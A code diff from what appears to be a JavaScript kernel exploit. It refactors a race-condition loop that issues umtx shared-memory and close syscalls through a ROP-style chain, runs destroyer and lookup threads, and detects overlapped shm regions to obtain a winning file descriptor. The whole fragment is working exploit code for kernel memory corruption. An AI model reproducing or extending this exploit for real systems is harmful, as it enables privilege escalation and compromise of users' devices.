@@ -806,7 +806,7 @@ const beforeRaceTime = performance.now();
 showTemporaryAlert("Triggering race...", LogLevel.LOG);
 
 async function executeRaceAttempt(i, i2) {
-    if (i2 % 4 === 0) log(`Race attempt ${i}-${i2}`, LogLevel.INFO | LogLevel.FLAG_TEMP);
+    if (i2 % 4 === 0) await log(`Race attempt ${i}-${i2}`, LogLevel.INFO | LogLevel.FLAG_TEMP);
 
     chain.self_healing_syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_CREAT, primaryShmKeyBuf);
     chain.write_result(mainFdBuf);
@@ -817,23 +817,22 @@ async function executeRaceAttempt(i, i2) {
         chain.self_healing_syscall_2(SYS_CLOSE, mainFdBuf, true);
     });
 
-    await chain.run(); // Ejecutamos solo una vez
+    await chain.run();
 
     await waitForRaceThreadsState(threadStatus.READY);
-
     p.write8(commonThreadData.resume, 0);
     p.write8(commonThreadData.start, 1);
-
     await waitForRaceThreadsState(threadStatus.DONE);
 
     let destroyCount = p.read4(destroyerThread0Data.destroyCount) + p.read4(destroyerThread1Data.destroyCount);
     let lookupFd = p.read4(lookupThreadData.fd);
-    
+
     const fd = await getShmFdFromSize(lookupFd);
     if (fd) {
         winnerFd = fd;
         winnerLookupFd = lookupFd;
-        log(`Overlapped shm regions! winner_fd = ${winnerFd}`, LogLevel.LOG);
+        await log(`Overlapped shm regions! winner_fd = ${winnerFd}`, LogLevel.LOG);
+        return true;
     }
 
     if (destroyCount === 2 && lookupFd > 3) {
@@ -849,18 +848,17 @@ async function executeRaceAttempt(i, i2) {
         chain.push_write8(addr, 0);
     }
 
-    await chain.run(); // Ejecutamos solo una vez
-
-    return winnerFd ? true : false; // Retorna `true` si la carrera se ganó
+    await chain.run();
+    return false;
 }
 
 for (let i2 = 0; i2 < config.max_race_attempts; i2 += 2) {
-    const [race1, race2] = await Promise.all([
+    let results = await Promise.allSettled([
         executeRaceAttempt(i, i2),
         i2 + 1 < config.max_race_attempts ? executeRaceAttempt(i, i2 + 1) : Promise.resolve(false)
     ]);
 
-    if (race1 || race2) break; // Si cualquiera gana la carrera, terminamos
+    if (results.some(result => result.status === "fulfilled" && result.value === true)) break;
 
     await resetCommonData();
     resetLookupThreadState();
@@ -871,6 +869,7 @@ for (let i2 = 0; i2 < config.max_race_attempts; i2 += 2) {
         p.write8(commonThreadData.resume, 1);
     }
 }
+
 
 
 
